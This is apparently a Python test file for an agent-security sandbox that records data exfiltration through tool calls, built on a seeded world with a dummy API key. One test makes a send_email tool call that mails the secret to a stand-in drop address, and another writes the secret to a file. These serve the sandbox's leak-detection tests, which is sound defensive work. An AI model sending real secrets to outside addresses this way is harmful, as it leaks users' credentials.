from __future__ import annotations

from taintwall.agent.sinks import ExfilRecorder
from taintwall.agent.tools import SINK_TOOLS, ToolCall, build_default_registry
from taintwall.agent.world import World


def _fixture() -> tuple[World, ExfilRecorder]:
    world = World.seeded(
        emails={"1": "Q3 numbers attached."},
        pages={"https://example.com/a": "Nothing to see."},
        files={"notes.txt": "meeting notes"},
        secrets={"api_key": "sk-SECRET-000"},
    )
    return world, ExfilRecorder()


def test_read_email_returns_body() -> None:
    world, recorder = _fixture()
    registry = build_default_registry(world, recorder)

    result = registry.call(ToolCall("read_email", {"id": "1"}))

    assert result.content == "Q3 numbers attached."
    assert result.is_error is False


def test_unknown_email_is_an_error_not_an_exception() -> None:
    world, recorder = _fixture()
    registry = build_default_registry(world, recorder)

    result = registry.call(ToolCall("read_email", {"id": "999"}))

    assert result.is_error is True


def test_unknown_tool_is_an_error() -> None:
    world, recorder = _fixture()
    registry = build_default_registry(world, recorder)

    assert registry.call(ToolCall("delete_everything", {})).is_error is True


def test_send_email_records_an_exfil_event_and_makes_no_network_call() -> None:
    world, recorder = _fixture()
    registry = build_default_registry(world, recorder)

    registry.call(
        ToolCall(
            "send_email",
            {"to": "drop@example.invalid", "subject": "x", "body": "sk-SECRET-000"},
        )
    )

    assert recorder.destinations() == ("drop@example.invalid",)
    assert recorder.leaked("sk-SECRET-000") is True


def test_write_file_updates_the_world_and_records_the_write() -> None:
    world, recorder = _fixture()
    registry = build_default_registry(world, recorder)

    registry.call(ToolCall("write_file", {"path": "out.txt", "content": "sk-SECRET-000"}))

    assert world.files["out.txt"] == "sk-SECRET-000"
    assert recorder.leaked("sk-SECRET-000") is True


def test_capabilities_partition_reads_from_sinks() -> None:
    world, recorder = _fixture()
    registry = build_default_registry(world, recorder)

    assert registry.capability_of("http_post") == "http_post"
    assert set(registry.names()) >= SINK_TOOLS
